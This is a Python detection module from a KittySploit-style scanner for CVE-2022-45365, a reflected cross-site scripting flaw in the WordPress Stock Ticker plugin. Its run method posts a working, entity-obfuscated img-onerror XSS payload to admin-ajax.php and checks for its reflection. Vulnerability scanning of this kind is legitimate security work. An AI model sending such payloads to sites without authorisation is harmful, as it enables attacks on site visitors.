#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Stock Ticker plugin for WordPress is vulnerable to Reflected Cross-Site Scripting in the ajax_stockticker_."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Stock Ticker <= 3.23.2 - Cross-Site-Scripting Detection',
        'description': 'The Stock Ticker plugin for WordPress is vulnerable to Reflected Cross-Site Scripting in the ajax_stockticker_symbol_search_test function in versions up to, and including, 3.23.2 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that execute if they can successfully trick a user into performing an action such as clicking on a link.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2022', 'cve', 'wordpress', 'wp-plugin', 'wpscan', 'wp', 'stock-ticker', 'unauth', 'xss', 'urosevic', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/stock-ticker/stock-ticker-3232-reflected-cross-site-scripting-in-ajax-stockticker-symbol-search-test',
            'https://patchstack.com/database/vulnerability/stock-ticker/wordpress-stock-ticker-plugin-3-23-2-reflected-cross-site-scripting-xss-vulnerability',
            'https://wordpress.org/plugins/stock-ticker/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-45365',
            'https://patchstack.com/database/vulnerability/stock-ticker/wordpress-stock-ticker-plugin-3-23-2-reflected-cross-site-scripting-xss-vulnerability?_s_id=cve',
        ],
        'cve': 'CVE-2022-45365',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='action=stockticker_symbol_search_test&symbol=test&endpoint=%3Cimg+src%3Dx+onerror%3D%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%28document.domain%29%3E\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('Stock Ticker Fatal', '<IMG SRC=X ONERROR=',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Stock Ticker <= 3.23.2 - Cross-Site-Scripting detected', path=path)
            return True
        return False

